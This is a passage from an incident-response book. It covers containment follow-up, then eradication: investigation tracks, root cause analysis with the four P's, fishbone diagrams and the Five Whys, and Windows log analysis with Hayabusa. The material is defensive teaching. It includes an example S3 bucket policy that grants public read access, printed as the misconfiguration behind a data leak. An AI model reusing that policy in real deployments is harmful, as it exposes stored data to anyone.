# Chapter 13: Eradicate Activity: Persistence Removal & Patching

> Source: PDF Pages 296-400 (Total Pages: 105)

Enable termination protection on contained instances to prevent accidental deletion.

◦ Apply deletion locks on critical resources containing evidence.

◦ Create snapshots of compromised volumes and virtual machine states for forensic analysis.

5. Address SaaS platform containment limitations, including:

◦ Reset passwords or set temporary random passwords, blocking account access.

◦ Use platform-specific freeze features to preserve data while blocking sign-in.

◦ Revoke active sessions through administrative interfaces where available.

◦ Contact the SaaS provider support team for capabilities beyond the exposed administrative features.

6. Contain serverless and ephemeral resources, including:

◦ Disable event triggers invoking compromised serverless functions or containers.

◦ Replace function code with deny-and-log implementations that capture invocation attempts.

◦ Revoke IAM roles and service permissions for serverless resources.

Step 5. Address Remote Work and Modern Environment Challenges

1. Implement endpoint-focused containment for remote workers, including:

◦ Use EDR isolation features rather than network-based controls for home network devices.

◦ Apply per-user or per-device VPN access policies to restrict compromised sessions without

disrupting all remote workers.

◦ Leverage identity-based controls and conditional access policies for SaaS applications accessed

directly over the internet.

◦ Coordinate with employees for secure device recovery through shipping or on-site visits.

◦ Balance forensic evidence preservation against business continuity and logistical complexity.

2. Manage BYOD and personal device scenarios, including:

◦ Use MDM or MAM solutions to selectively manage corporate data without affecting personal

information.

◦ Apply conditional access policies requiring device compliance for corporate resource access.

◦ Respect privacy boundaries while maintaining organizational security requirements.

3. Account for encrypted communications challenges, including:

◦ Implement TLS inspection proxies where possible to analyze encrypted communications from

attackers.

◦ Restrict egress TLS traffic to pass through inspection points and investigate connections that bypass

them.

◦ Address DNS over HTTPS (DoH) limitations by using host-based DNS overrides, local DoH servers,

or browser policy controls to redirect attacker domains.

◦ Balance the benefits of security inspection against privacy concerns and application compatibility

issues.

4. Address non-traditional compromise scenarios, including:

◦ Implement email flow redirection and conditional access for Business Email Compromise incidents.

◦ Coordinate with external parties for supply chain and partner ecosystem breaches.

◦ Focus containment on access control boundaries when direct system control is unavailable.

◦ Revoke API access tokens to prevent further data synchronization with compromised third parties.

Step 6. Collect and Preserve Evidence

This step preserves volatile evidence; eradicate Step 1 interprets the captured artifacts during short-form

investigation.

1. Determine evidence collection timing based on organizational priorities, including:

◦ Weigh the loss of possible evidence due to containment actions against the risk of allowing attackers

to maintain access while evidence is collected.

◦ Organizations with robust logging and external data sources (network flow logs, host telemetry

agents, NDR) can isolate first, then collect, reducing attacker interference.

◦ Organizations without alternate data sources for volatile network connections should collect before

isolation so evidence of active connections is not lost.

2. Prioritize volatile data collection immediately, including:

◦ Capture memory dumps from affected systems using a whole-system memory acquisition tool

appropriate to the OS.

◦ Record active network connections before isolation terminates them.

◦ Document running processes and services with parent-child relationships.

◦ Preserve temporary files and cache data before normal system operations clear them.

3. Collect system artifacts with longer preservation timeframes, including:

◦ Export registry hives identifying persistence mechanisms.

◦ Preserve event logs, audit trails, and authentication records.

◦ Capture file system metadata, Prefetch files, ShimCache, and AmCache records.

◦ Document browser history and cache, revealing attacker reconnaissance.

4. Capture network and application evidence, including:

◦ Collect packet captures from critical time periods (if storage permits).

◦ Export NetFlow data, VPC Flow Logs, and firewall logs showing connection patterns.

◦ Preserve DNS query logs revealing command-and-control infrastructure.

◦ Collect web server logs, database transaction logs, and application audit trails.

◦ Export cloud service audit logs before retention policies delete them.

Step 7. Validate Containment Effectiveness

1. Monitor network communications for continued attacker activity, including:

◦ Review firewall logs, proxy logs, and DNS queries for connections to attacker infrastructure.

◦ Watch for new communication patterns indicating alternative command-and-control channels.

◦ Validate containment using external data sources (network flow logs, host telemetry agents, NDR

tools) when network isolation severs direct connections to contained systems.

◦ Combine network monitoring from appliances with live investigation of contained systems.

◦ Compare pre-containment and post-containment traffic patterns.

2. Verify malicious processes have ceased, including:

◦ Monitor process creation on contained systems using EDR or host telemetry data.

◦ Track unusual parent-child process relationships and uncommon executable paths.

◦ Watch for new service installations representing attacker persistence.

◦ Use process inspection utilities for baseline comparison.

3. Analyze logs for indicators of persistent compromise, including:

◦ Monitor authentication logs for failed attempts to gain access using alternative credentials.

◦ Watch for privilege escalation attempts that suggest local, persistent access.

◦ Identify unusual file access patterns indicating continued data exfiltration.

◦ Review both the system logs and external logging sources.

Contain Activity | Chapter 12 | 273

4. Establish baselines and compare pre-containment and post-containment activity, including:

◦ Document expected process activity on contained systems and investigate deviations.

◦ Compare network traffic, process execution, and log activity before and after containment.

◦ Verify that malicious activities have ceased rather than shifted to different techniques or alternative

infrastructure.

Step 8. Document Containment Actions and Communicate Status

1. Document containment decisions with complete context, including:

◦ Record rationale for containment strategy selection (passive, active, or adaptive).

◦ Timestamp each containment measure deployment with the responsible personnel.

◦ Document which systems, accounts, and services were affected by each action.

◦ Capture the options considered and the reasoning behind the chosen approach.

◦ Maintain the chain of custody for all collected evidence.

2. Assess and document operational impact, including:

◦ Identify business functions affected by each containment action.

◦ Estimate user count experiencing service disruptions.

◦ Calculate revenue impact from system downtime where applicable.

◦ Document workarounds implemented to maintain critical operations.

◦ Gather feedback from business unit leaders for future planning.

3. Communicate appropriately with diverse stakeholders, including:

◦ Provide executive summaries focusing on business impact, risk reduction, and resource needs.

◦ Deliver technical briefings with implementation details for IT and security teams.

◦ Notify affected users about service disruptions, workarounds, and resolution timelines.

◦ Coordinate with legal, compliance, and public relations teams on regulatory obligations.

4. Prepare for subsequent incident response phases, including:

◦ Organize collected evidence for eradication planning and threat intelligence analysis.

◦ Create a system inventory prioritizing the recovery sequence.

◦ Surface containment-phase feedback (control gaps, playbook issues, tooling limitations) to debrief

Step 8 rather than acting on them within the contain activity.

◦ Identify additional scoping needs revealed during containment activities.

[1] McMillan, Robert and Volz, Dustin, "Stryker Hit With Suspected Iran-Linked Cyberattack," The Wall Street Journal, March 2026,

www.wsj.com/articles/stryker-hit-with-suspected-iran-linked-cyberattack-52f6615c

[2] U.S. Department of Health & Human Services, "Breach Notification Rule," www.hhs.gov/hipaa/for-professionals/breach-

notification/breach-reporting/index.html

[3] PCI Security Standards Council, "Responding to a Cardholder Data Breach," listings.pcisecuritystandards.org/documents/

Responding_to_a_Cardholder_Data_Breach.pdf

[4] General Data Protection Regulation (GDPR), "Article 33 - Notification of a personal data breach to the supervisory authority," gdpr-

info.eu/art-33-gdpr/

[5] Microsoft, "Detect and Remediate Illicit Consent Grants," learn.microsoft.com/en-us/defender-office-365/detect-and-remediate-

illicit-consent-grants

Contain Activity | Chapter 12 | 275

13 Eradicate Activity

The eradicate activity represents an important waypoint in the incident response process where the focus

shifts from containing the attacker’s operations to systematically removing their presence and undoing the

changes they made to the environment. Unlike containment, which aims to stop the attacker’s ongoing

activities and prevent continued access, eradication focuses on eliminating the attacker’s access and

restoring systems to a secure state. Eradication stops short of full recovery, instead focusing on building the

understanding needed to safely restore normal operations in the subsequent recover activity.

Figure 91 | Eradicate Activity Waypoint

This chapter covers the objectives of eradication, strategies for timing and sequencing eradication actions,

investigation techniques to inform eradication efforts, and practical steps for removing attacker artifacts

and persistence mechanisms from the environment. It also addresses validating eradication success and

documenting eradication activities for future reference before looking at activity examples.

ERADICATE OBJECTIVES

Effective eradication requires comprehensive insight gained through investigative actions and careful

analysis of collected evidence. Like the contain activity, the eradicate activity consists of two primary

components: analyzing the collected data and eliminating the attacker’s presence. However, decisions made

during eradication will have a significant impact on the environment, requiring a careful balance between

investigative rigor and urgency to restore operations while meeting the organization’s needs.

In this section, we’ll examine why thorough investigation prevents recurrence rather than only treating

symptoms, how short-form and long-form investigation tracks run in parallel to balance urgency against

forensic depth, and how root cause analysis uncovers the conditions that enabled the compromise.

Preventing Incident Recurrence Through Investigation

The temptation to skip investigation and jump straight to system rebuild is a common problem during

eradication. Wiping a drive, reinstalling the operating system from scratch, and restoring from backup

appear to guarantee a clean system. Decision makers may show a preference for this approach because it

even offers a specific, tested timeline learned during Business Disaster Recovery (BDR) preparedness: "The

system will be back online in four hours."

However, this shortcut fails to address the underlying causes of the compromise.

Without determining what caused the incident and identifying the root cause, the risk of recompromise

through the same vector remains. Organizations repeatedly experience a familiar pattern: analysts take

systems down and rebuild them from clean media or gold images, then return them to production, only for

the attacker to compromise the same systems again hours, days, or weeks later.

In the eradicate activity, incident response teams need enough understanding to answer specific questions:

• What was the initial access vector? (Has it been closed?)

• What credentials were compromised? (Have they been rotated?)

• What other systems did the attacker access? (Are they also eradicated?).

• What persistence mechanisms did the attacker deploy? (Are they all identified and removed?).

• What vulnerability enabled the attack? (Has it been patched?).

Investigation provides the answers that prevent incident recurrence.

Investigation During Eradication

The eradication activity focuses on removing the attacker’s access and returning systems to a more secure

state. However, the pressure is on: contained systems cannot serve their intended purpose, users are

disrupted, and the organization is losing productivity by the hour. System owners want production assets

back online immediately. The IRT should recognize that rushing eradication risks leaving persistent access

mechanisms and vulnerabilities behind, which can lead to new incidents days later.

At the same time, analyzing the collected evidence takes time. Analyzing logs, memory captures, disk

images, and network traffic to understand the attacker’s methods and persistence mechanisms can take

days or weeks. The longer the investigation takes, the longer systems remain offline, increasing business

impact and stakeholder frustration.

This tension defines the eradicate activity: balance the investigative work needed to understand what the

Eradicate Activity | Chapter 13 | 277

attacker did against the urgent need to restore operations. Rushing to rebuild without investigation could

leave the same vulnerability open for the attacker to return. Spend too long investigating every detail, and

the business impact compounds while leadership questions why systems remain offline days after the

problem was contained. To best accommodate the organization’s needs, incident responders can separate

the investigation into two tracks: an immediate investigation to inform eradication actions, and a deeper

forensic analysis that continues in parallel.

These two investigative tracks, referred to here as short-form investigation and long-form investigation,

serve distinct purposes during eradication, as shown in Short-Form vs Long-Form Investigation.

Figure 92 | Short-Form vs Long-Form Investigation

Short-form investigation focuses on quickly analyzing the evidence collected during containment to identify

the attacker’s methods, persistence mechanisms, and compromised systems. The goal is to gain sufficient

understanding to inform prompt eradication actions, minimizing business disruption.

Long-form investigation can continue in parallel, delving deeper into the attacker’s tactics, techniques, and

procedures (TTPs). This track aims to build a comprehensive understanding of the incident for future

prevention, legal proceedings, or organizational learning. A long-form investigation may involve more

extensive forensic analysis and collaboration with external experts. While this track will take longer and

require more investigative resources (and cost), it may meet additional organizational requirements beyond

immediate eradication needs, such as regulatory compliance or evidence preparation for legal proceedings.

Working with decision makers throughout eradication to define the scope and priorities of these two

investigative tracks helps ensure that the incident response team meets both the urgent need to restore

operations and the longer-term goal of understanding and preventing future incidents.

Short-Form Investigation to Inform Eradication

The eradication activity requires that analysts investigate the evidence collected during containment to

understand the attacker’s methods and persistence mechanisms, then take action to remove the attacker

from the environment. Responders need enough understanding to answer critical questions:

• What did the attacker do?

• How did they get in?

• Where else might they be?

• What needs to be removed to ensure they cannot return through the same methods?

Eradication demands a practical understanding of the attacker’s TTPs sufficient to ensure their complete

removal from the environment. As incident responders discover new indicators of compromise or

persistence mechanisms during eradication, they should expand their efforts accordingly, contributing new

insight into additional iterations of the response actions loop.

Eradication requires practical remediation: remove what the attacker installed, close the entry points they

exploited, and restore systems to operation with confidence that the compromise will not immediately

recur. Developing this understanding and applying it is the focus of the eradicate activity, with particular

emphasis on performing root cause analysis to uncover the full scope of the compromise and prevent the

same attack from succeeding again.

THE DIRTY KEBAB: SHORT-FORM INVESTIGATION

My tech editor Steve Armstrong and I were on a call discussing a compromised Windows workstation

caught up in a broader incident he was coordinating. The threat hunting team suspected the

workstation belonged in scope, and Steve needed to make a quick decision on what kind of priority

the workstation warranted for eradication. He didn’t need a forensic masterpiece. He needed enough

detail to make a decision. In his delightfully British way, he put it like this:

“Sometimes all you need is a dirty kebab.

This was a new expression for me. Steve explained: a dirty kebab is the late-night staple of British

pub-goers, a doner (meat cooked on a rotisserie) slathered in "an illegal amount of chili garlic sauce"

from a takeaway shop you’d never visit sober. It’s not gourmet. It’s not pretty. But at one in the

morning on the walk home, it’s exactly what’s called for. The closest American equivalent, he offered,

is a gas station hot dog, with roughly the same gastric risk profile.

The metaphor was spot-on. Sometimes, short-form investigations are all that is required to get just

enough insight to inform incident response actions. A short-form investigation skips the deep

forensic rigor in favor of answering the immediate question: is this system compromised, and what

needs to be removed to be confident it isn’t anymore? Responders deliver an early assessment, the

team makes an informed call, and operations move forward.

Not every incident warrants the full long-form treatment, and not every system warrants a deep-dive

Eradicate Activity | Chapter 13 | 279

analysis. The dirty kebab approach is another tool available to the organization to manage resources,

to gain quick insight when time is limited, and to support the urgent need to restore operations. The

art is knowing when the case calls for a dirty kebab and when it calls for something more substantial.

Long-Form Investigation for Comprehensive Understanding

While short-form investigation focuses on gathering enough understanding to inform eradication actions,

long-form investigation (sometimes, deep-dive investigation ) may continue in parallel to build a

comprehensive understanding of the incident. Long-form investigation aims to uncover a greater

understanding of the incident using forensic analysis techniques that often require more time and

specialized expertise.

Long-form investigation serves purposes beyond immediate eradication needs. Organizations may require

detailed forensic analysis for regulatory compliance, legal proceedings, insurance claims, or threat

intelligence development. These investigations document the complete attack timeline, identify all

compromised data, and build comprehensive evidence packages that meet legal standards for admissibility.

It can be difficult or impossible to perform this level of detailed analysis within the time constraints of

urgent eradication efforts, but it is also important not to hold up the business objectives of restoring

operations. Organizations should balance the need for short-form investigation to support eradication with

the benefits of long-form investigation for broader organizational goals.

The depth and rigor of long-form investigation exceed what is practical during urgent

eradication efforts, but they provide value for organizational learning, future prevention,

and regulatory or legal proceedings.

The scope of long-form investigation should be defined in coordination with decision makers based on

organizational requirements:

• Legal counsel confirms which evidence standards apply for potential litigation or regulatory reporting

(ideally as part of the prepare activity rather than mid-incident).

• Compliance teams can specify the documentation required to satisfy audit requirements or regulatory

obligations.

• Risk management can determine the level of investigation warranted based on the severity and impact

of the incident.

This coordination ensures that investigative resources focus on activities that provide tangible value to the

organization.

Incident response teams should work with decision makers to define the scope and priorities of

investigation tracks during the eradication activity. Wherever possible, organizations should focus on short-

form investigations to inform eradication actions, while long-form investigations continue in parallel to

meet broader organizational goals.

LONG-FORM INVESTIGATION EXAMPLE: IDAHO MURDERS

Heather Barnhart, DFIR Curriculum Lead and Head of Faculty at SANS Institute, was a principal

investigator on a high-profile criminal case involving the murders of four University of Idaho

students: Madison Mogen, 21; Kaylee Goncalves, 21; Xana Kernodle, 20; and Ethan Chapin, 20. In an

RSAC 2025 webcast, Heather shared insights from her experience applying long-form digital forensics

techniques to support the criminal investigation and dispel the alibi of the perpetrator, Bryan

Kohberger (BK). [1]

Figure 93 | BK Android Device Log

The investigating team seized BK’s Android phone and performed a comprehensive forensic analysis

of the device, using Magnet GrayKey to unlock it and extract a full image of the phone storage. Using

Cellebrite Physical Analyzer, Barnhart reviewed the device logs to reconstruct BK’s actions leading up

to and following the murders. Through native data extraction and subsequent manual analysis,

including the use of the Android eRR.p log file, Barnhart identified when BK powered down his phone

then powered it back on at 100% battery. This evidence revealed actions inconsistent with his alibi

and corroborated his anti-forensic efforts to hide his presence at the crime scene.

Barnhart’s long-form investigation provided critical evidence that BK had been at the crime scene

during the time of the murders, contradicting his claims of being elsewhere. The thoroughness of the

forensic analysis contributed to BK’s guilty plea, supporting investigators in achieving justice for the

victims and their families.

The same forensic rigor that Barnhart applied to criminal investigation translates directly to incident

response. Long-form investigation in IR contexts demands similar depth: full device imaging, manual

analysis of native log files, timeline reconstruction from low-level artifacts, and identification of anti-

forensic or evasion techniques. While criminal investigations pursue justice and IR investigations

pursue security restoration, both require meticulous forensic analysis when comprehensive evidence

is needed.

Eradicate Activity | Chapter 13 | 281

Pursuing Root Cause Analysis

Whether during short-form or long-form investigation, root cause analysis remains a central objective of

the eradicate activity. Root cause analysis serves an important purpose: understanding the vulnerabilities or

shortcomings in the organization’s security that led to the attacker’s opportunity. While addressing the

underlying security weaknesses discovered through this analysis belongs in the recover activity,

understanding how the attacker exploited those weaknesses is essential to effective eradication.

When incident responders understand only the symptoms of compromise without

investigating the root cause, they risk leaving behind persistence mechanisms or

overlooking compromised systems. For example, discovering malware on a system is a

symptom, but understanding that the malware arrived through a phishing email that

compromised multiple user accounts reveals the scope of systems that require eradication

efforts.

In the eradication activity, incident responders evaluate the information collected during containment to

assess and understand the attacker’s methods. Working backwards from the symptoms of compromise to

identify shortcomings in the organization’s defenses builds the understanding needed to effectively remove

the attacker from the environment.

In modern incidents, attackers often leverage multiple opportunities and security shortcomings to gain and

maintain access to the environment. Root cause analysis helps identify all these opportunities, ensuring that

eradication efforts address the full scope of the compromise rather than just the most obvious symptoms.

FINTECH SSH COMPROMISE: ROOT CAUSE ANALYSIS

Bob wanted to fire Alan. I wanted to know what Bob was covering up.

Several years ago, I worked on an incident response engagement for a fintech company that had

suffered an SSH compromise of its Linux transaction-processing cluster. An external attacker gained

root access to one of their servers, and we were called in to investigate.

Bob, the security lead, met us at the door with his conclusion ready: "Alan set a weak root password.

The attacker guessed it. Alan needs to be fired. You’re not needed here."

I thanked him for the input and explained we’d be conducting our own investigation anyway.

During our analysis, we learned that Alan was a junior sysadmin: recently hired, he had some IT

background, but was light on cybersecurity and Linux experience. He’d been working a ticket and

changed a root password to company123. The server was internet-facing with SSH password

authentication enabled. An attacker found it and walked right in.

Bob was right about the password. He was wrong about everything else.

When we presented our findings to the executive team, Bob repeated his theory: "Alan’s weak

password caused the breach. We need to fire Alan."

"The password was definitely a factor," I said. "But let’s talk about what else we found."

Our root cause analysis revealed a stack of failures:

• SSH was exposed to the internet with no documented business justification.

• Remote root login was enabled, a non-default SSH server setting.

• Password authentication was allowed instead of key-based authentication.

• Failed authentication attempts were logged, but no one monitored them.

• No password complexity policy existed to prevent weak passwords.

• No change control process required approval for root password changes on production systems.

The executives started asking the obvious questions: Why wasn’t monitoring in place? Who approved

the SSH configuration? Why weren’t these basic controls implemented?

We later learned that Bob was responsible for all of these. He’d prioritized changes to make remote

access and management easier, while deprioritizing SSH security features. Alan wasn’t fired.

Root cause analysis isn’t about finding who to blame or focusing on a single element of the incident.

Instead, it’s about finding what to fix. Often, those are different things.

Assessing Root Cause

During the eradication activity, effective root cause analysis is essential for complete incident resolution.

Without understanding the underlying causes of the compromise, responders risk leaving persistence

mechanisms in place, missing compromised systems, or allowing the same attack to succeed again through

different entry points. Root cause analysis helps responders move beyond simply removing the attacker’s

immediate access to addressing the systemic weaknesses that exposed the environment to compromise.

Root cause analysis during incident response serves several goals. First, it helps the response team

understand the complete attack chain, from initial access through privilege escalation, lateral movement,

and data exfiltration, ensuring analysts identify all compromised systems and artifacts requiring eradication.

Second, it reveals systemic weaknesses in security controls, processes, and policies that enabled the attack.

Finally, it guides eradication priorities by distinguishing between surface-level symptoms and underlying

causes that, if left unaddressed, would enable similar attacks.

To perform systematic root cause analysis during incident response, responders follow a structured

approach:

• Define the effect: what happened, which systems were compromised, what data was accessed, and what

business impact occurred.

• Group possible causes into categories using a framework that organizes contributing factors, such as

the four P’s: People, Process, Product, and Policy.

• Populate each category with specific findings from the investigation.

• Identify remediation activities for each root cause.

• Prioritize and implement changes that address multiple contributing factors or the highest-risk

exposure areas.

The four P’s framework provides a method for categorizing root causes. Used in incident response, it helps

organize findings from investigations into manageable areas for analysis and remediation. By recognizing

that incidents often result from a combination of human, procedural, technical, and governance failures,

responders can use the four Ps as a tool to brainstorm and document root causes:

• The People category encompasses human factors, including insufficient training, lack of security

awareness, susceptibility to social engineering, inadequate staffing, and practices not codified as policy

Eradicate Activity | Chapter 13 | 283

that contributed to the incident.

• The Process category captures procedural shortcomings, such as missing security reviews, inadequate

change management, insufficient vulnerability scanning, or absent monitoring processes.

• The Product category addresses technical factors, including software vulnerabilities, misconfigured

systems, missing security features, inadequate logging capabilities, or end-of-life (unmaintained)

technology.

• The Policy category covers governance issues such as missing or inadequate security policies, unclear

accountability, insufficient compliance requirements, or a lack of enforcement mechanisms.

Next, consider applying this root cause analysis approach to a cloud security incident example.

Root Cause Analysis Example: Public S3 Bucket Exposure

My team worked on an incident for a customer where an S3 bucket named dat-ng-cdn-890378906859

containing customer data had been publicly accessible for several months, resulting in unauthorized data

exposure. The initial investigation identified the immediate cause: a developer misconfigured the S3 bucket

permissions when deploying a new feature, setting the access control to allow any authenticated S3

principal to list and read the bucket contents, as shown in Listing 62.

Listing 62 | Permissive Principal Policy for S3 Bucket

{

"Id": "dat-ng-cdn-890378906859-Policy",

"Statement": [

{

"Action": [

"s3:Get*",

"s3:List*"

],

"Effect": "Allow",

"Principal": {

"AWS": "*" 1

},

"Resource": [

"arn:aws:s3:::dat-ng-cdn-890378906859",

"arn:aws:s3:::dat-ng-cdn-890378906859/*"

],

"Sid": "AllowPublicRead"

},

]

}

1 Grant all Get and List privileges on the bucket to any AWS user.

This surface-level analysis pointed to a single action: a developer’s misconfiguration. However, applying

systematic root cause analysis reveals a much broader risk of exposure. Using the iceberg model across the

four P’s, we can envision the insecure S3 bucket as one element of risk, but the people, process, product,

and policy elements should also be considered, as shown in Figure 94.

Figure 94 | S3 Bucket Root Cause Analysis

Looking at the people category, we found that developers lacked adequate training on cloud security best

practices and secure AWS configuration. The developer who created the bucket had not received training

on S3 access controls or data classification requirements. Additionally, there was no clear understanding

within the development team about who was responsible for reviewing and approving cloud infrastructure

changes, leading to assumptions that "someone else" would catch security issues.

Examining the process category revealed multiple procedural gaps that allowed the misconfiguration to

persist undetected. The organization lacked a code review and approval process for Infrastructure-as-Code

(IaC) templates, so the Terraform configuration that defined the bucket’s public access was never reviewed

by another engineer. There was no IaC automated scanning before deployment to detect security

misconfigurations. The deployment pipeline lacked a security approval gate that would require sign-off

before provisioning resources with external access. After deployment, no regular auditing process scanned

for publicly accessible S3 buckets across the AWS environment.

The product category identified technical control failures that compounded the problem. The organization’s

IaC templates used for provisioning new buckets lacked secure defaults, requiring developers to explicitly

configure security rather than inheriting safe settings. AWS CloudTrail logging was enabled, but no alerts

were configured to notify the security team when there were unusual access patterns to the bucket. The

organization had no automated remediation tools (like AWS Config rules) that would automatically revert

dangerous permission changes.

An analysis of the policy category revealed governance and compliance gaps. The organization lacked a data

classification policy requiring developers to identify sensitive data and apply appropriate access controls

before storage. There was no cloud security policy establishing least-privilege requirements for S3 buckets.

The change management policy didn’t require a security review for infrastructure changes, treating cloud

resource provisioning as routine IT operations. Additionally, there was no audit process to verify that cloud

resources met security standards and regulatory requirements.

Eradicate Activity | Chapter 13 | 285

This comprehensive root cause analysis transformed a simple developer error into a list of systemic failures

that all contributed to the incident. Each identified root cause becomes a target for eradication and

recovery actions: developer training programs, code review processes, IaC security scanning tools, secure

default templates, automated alerting and remediation, and comprehensive cloud security policies. By

addressing these underlying causes rather than simply changing the bucket permissions back to private, the

organization reduced the likelihood of similar incidents across its entire cloud infrastructure. The

improvements extended well beyond this single bucket.

Fishbone Diagram Mapping

A fishbone diagram (also known as a cause-and-effect diagram or an Ishikawa diagram) is a valuable tool to

visually represent root cause analysis, illustrating how multiple contributing factors led to the incident.

Developed by University of Tokyo professor Kaoru Ishikawa in the 1960s for quality management purposes,

the diagram resembles a fish skeleton, with the head representing the problem (the effect) and the bones

branching off to represent categories of potential issues (the causes). Ishikawa designed this tool to help

teams systematically identify and analyze the root causes of problems rather than just addressing

symptoms, using a visual format accessible to different learning styles.

Conventionally, the fishbone diagram included primary branch categories that represent the six M’s: Man

(people), Machine (technology), Materials (data), Methods, Measurement, and Milieu (environment). An

example of a fishbone diagram using the six M categories is shown in Figure 95. [2]

Figure 95 | Fishbone Diagram Example

While defining the six M’s provides valuable distinction for some environments, the structure of the

fishbone diagram can be simplified with an approach tailored to incident response. Instead of categorizing

each cause under the six M’s, responders can broadly group causes into categories relevant to security

incidents using the four P’s. Using the fintech SSH compromise (see Fintech SSH Compromise: Root Cause

Analysis), a fishbone diagram using the four P’s captures the root causes identified during the investigation

(Figure 96).

There can be overlap between these categories, captured using the four P root cause

analysis. This is not intended to be a strict taxonomy, but rather as a tool to consider,

identify, and organize potential causes for analysis.

Figure 96 | Fishbone Illustration: Fintech SSH Compromise

By visually mapping root causes, the fishbone diagram helps responders see how multiple contributing

factors across people, processes, products, and policies led to the incident. The four P’s approach,

integrated with the visual structure of a fishbone diagram, provides analysts with a practical tool for

systematically exploring and documenting root causes during incident response.

ALTERNATIVE TO FISHBONE DIAGRAM: THE FIVE WHYS

A fishbone diagram provides a structured way to visualize root cause analysis, and has the distinct

advantage of producing a visual map that teams can collaboratively build and analyze. However, it is

also easy to become overwhelmed by the number of potential causes and branches in complex

incidents, and to waste time on the minutiae of less significant causes.

As an alternative, the Five Whys technique, originally developed by Sakichi Toyoda, the founder of

what later became Toyota Industries, provides a simpler approach to root cause analysis by

repeatedly asking "Why?" to drill down to the underlying causes of a problem. [3]

Start with the observed problem and ask, "Why did this happen?" Take the answer and ask "Why?"

again, continuing this process five times or until you reach a root cause that, if addressed, would

prevent the problem from recurring. The number five is not rigid. Sometimes you reach the root

cause in three iterations, other times you need seven. The goal is to move beyond symptoms to

identify the underlying systemic issues.

Consider the fintech SSH compromise example using the Five Whys approach:

Problem: Attacker gained unauthorized root access via SSH.

• Why 1:  Why did the attacker gain root access via SSH? Because they successfully authenticated

using the root password.

Eradicate Activity | Chapter 13 | 287

• Why 2:  Why could they authenticate with the root password? Because the root password was

weak, and they guessed it.

• Why 3: Why was the root password weak? Because no password complexity policy was enforced,

the system accepted a simple password.

• Why 4: Why was there no password complexity policy? Because no governance process requires

security hardening before deploying SSH services.

• Why 5:  Why was SSH even exposed to the internet with password authentication enabled?

Because the deployment process lacked security review and exposure management, the insecure

configuration went undetected.

This iterative questioning reveals multiple intervention points: weak passwords, missing complexity

policies, lack of governance, and poor exposure management. Each Why layer represents a potential

eradication or recovery action that addresses increasingly fundamental issues.

The Five Whys works best for focused, linear root cause analysis where a single primary chain of

causation exists. Use this technique when you need quick root-cause insight without extensive

documentation overhead, when working with small teams that can focus on a single investigation

thread, or when the incident appears to have a clear primary cause. Choose fishbone diagrams

instead when multiple parallel contributing factors exist, when you need visual documentation for

stakeholders, or when conducting collaborative analysis with larger cross-functional teams.

INVESTIGATION TECHNIQUES FOR ERADICATION

Before beginning eradication actions, incident responders should apply investigative techniques to

understand the full extent of the compromise and identify all artifacts requiring removal. These short-form

investigation techniques should be focused and time-boxed based on the urgency of restoring operations.

The response team should focus on gaining sufficient understanding to effectively revoke the attacker’s

access and remove their artifacts from the systems involved in the incident.

Investigative techniques are an ever-evolving area for digital forensics and incident response. This book

focuses on practical, widely applicable methods, but responders should stay current with emerging tools

and techniques through ongoing training and professional development. This section reviews practical

investigation techniques that can be applied quickly during eradication to gather the necessary insight. This

is not intended to be a full treatise on investigative techniques, but rather a practical guide to the most

relevant methods for gathering the information needed to inform eradication actions.

In this section, we’ll work through investigative approaches by data source and then by incident type. We’ll

cover log analysis, live investigation on running systems, endpoint detection and response telemetry,

memory forensics, network traffic analysis, and malware examination. We’ll then turn to investigation

patterns for specific incident categories: business email compromise, insider threats, supplier and supply

chain attacks, and cloud environments.

This point bears repeating: this book is not intended to provide comprehensive coverage of

digital forensics investigative techniques. It would be impossible to do so in a single

volume. Use the information presented here as a representative sample of practical

methods that can be applied for eradication actions.

Log Investigation

Log investigation examines system, application, and network logs collected during the contain activity to

reconstruct attacker activity and identify artifacts requiring eradication. Logs provide a temporal record of

events on systems and networks, revealing summary and detailed information about both normal and

abnormal activities. This historical perspective is valuable during eradication because it can reveal what the

attacker did over time, helping responders identify the systems involved in the incident and the artifacts

created.

Responders can use logging data collected from multiple systems to understand attacker activities. Logs

gathered from multiple sources, including operating system event logs, application logs, firewall logs, VPN

logs, authentication servers, and security appliances, each provide their own insight into the events that

occurred. The volume of log data can be substantial: a single compromised server may generate gigabytes of

logs spanning the attacker’s dwell time. Without proper aggregation and correlation tools, analyzing this

data becomes a manual, time-consuming process that delays eradication.

Sigma for Log Analysis

The Sigma project provides a standardized format for writing detection rules that can be applied to log data

from various sources. Unlike most detection methods built into commercial platforms, Sigma rules

represent a portable set of log analysis and alerting mechanisms that can be quickly applied during log

investigation to identify known IOCs and attacker behavior. [4]

While Sigma rules represent opportunities to characterize threats in many different log sources, including

Windows Event Logs, Syslog, cloud service logs, web server logs, and more, the Sigma project is not an

analysis tool in itself. Instead, the Sigma rules and the corresponding Sigma CLI tool provide a framework

for defining detection logic that can be converted into queries for specific log analysis platforms. For

example, a Sigma rule defining suspicious PowerShell activity can be converted into a Splunk search query,

an Elasticsearch query, or a query for other log analysis tools.

However, some tools natively support Sigma rules without requiring conversion into a backend system.  For

Windows Event Log analysis, the open-source tool Hayabusa is a fast forensic analysis tool to identify

threats using Sigma rules. [5]

Hayabusa quickly scans Windows Event Log (EVTX) files and generates a threat

report and optional timeline. For an analysis completed using EVTX files from multiple systems collected in

January and February 2020, the Hayabusa command shown in Listing 63 generates a CSV timeline report of

all identified threats during that period. The resulting CSV file will characterize the identified threats across

all analyzed event logs, providing insight into attacker activity during the incident. The timeline of threat

events is shown in Figure 97.

Listing 63 | Hayabusa Windows Event Log Analysis Command

$ hayabusa csv-timeline -d eventlogs/ -T -o hayabusa-threathunting.csv -E --timeline-start

"2020-01-01 00:00:00 +00:00"  --timeline-end "2020-02-28 00:00:00 +00:00" --no-color 1

┏┓  ┏┳━━━┳┓    ┏┳━━━┳━━┓┏┓  ┏┳━━━┳━━━┓

┃┃  ┃┃┏━┓┃┗┓┏┛┃┏━┓┃┏┓┃┃┃  ┃┃┏━┓┃┏━┓┃

┃┗━┛┃┃  ┃┣┓┗┛┏┫┃  ┃┃┗┛┗┫┃  ┃┃┗━━┫┃  ┃┃

┃┏━┓┃┗━┛┃┗┓┏┛┃┗━┛┃┏━┓┃┃  ┃┣━━┓┃┗━┛┃

┃┃  ┃┃┏━┓┃  ┃┃  ┃┏━┓┃┗━┛┃┗━┛┃┗━┛┃┏━┓┃

┗┛  ┗┻┛  ┗┛  ┗┛  ┗┛  ┗┻━━━┻━━━┻━━━┻┛  ┗┛

by Yamato Security

Start time: 2025/11/24 12:03

Eradicate Activity | Chapter 13 | 289

Total event log files: 361

